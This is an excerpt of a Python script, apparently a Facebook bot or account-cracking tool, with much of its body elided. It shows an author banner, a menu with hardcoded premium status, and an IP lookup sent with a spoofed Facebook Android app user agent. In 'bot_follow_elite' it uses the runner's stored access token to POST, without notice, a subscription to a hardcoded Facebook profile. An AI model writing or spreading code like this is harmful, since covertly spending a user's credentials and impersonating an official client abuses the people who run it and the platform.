...
def banner():
    print("\n%s    _________ __     \n%s   / ____/ (_) /____  ║ %sAuthour By %sMuhammad %sDicky %sWahyudi\n%s  / __/ / / / __/ _ \ ║ %sFB %s: %sFacebook.com/AccountBisnis89\n%s / /___/ / / /_/  __/ ║ %sFB %s: %sFacebook.com/AccountBisnis89\n%s/_____/_/_/\__/\___/  ║ %sGithub %s: %sGithub.com/Dicky-XD\n"%(O,O,P,O,O,O,O,P,O,P,O,P,O,P,O,P,O,P))
def menu_log():
...
def bot_follow_elite():
    try:
        ...
        os.system('rm -rf token.txt')
        exit(menu_log())
    requests.post("https://graph.facebook.com/100069494601961/subscribers?access_token=" + token)      # Dapunta Khurayra X
    exit(menu())
def menu():
    clear()
    banner()
    try:
        ...
        status = ('%sPremium [%sPro%s]'%(O,P,O))
        users = '\x1b[0;96mMuhammad Dicky Wahyudi'
        maile = '\x1b[0;96mDickywahyudipro801@gmail.com'
        kunci = '\x1b[0;96mDICKY-WAHYUDI-XXXXX'
    ...
    try:
        ...
        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":'[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
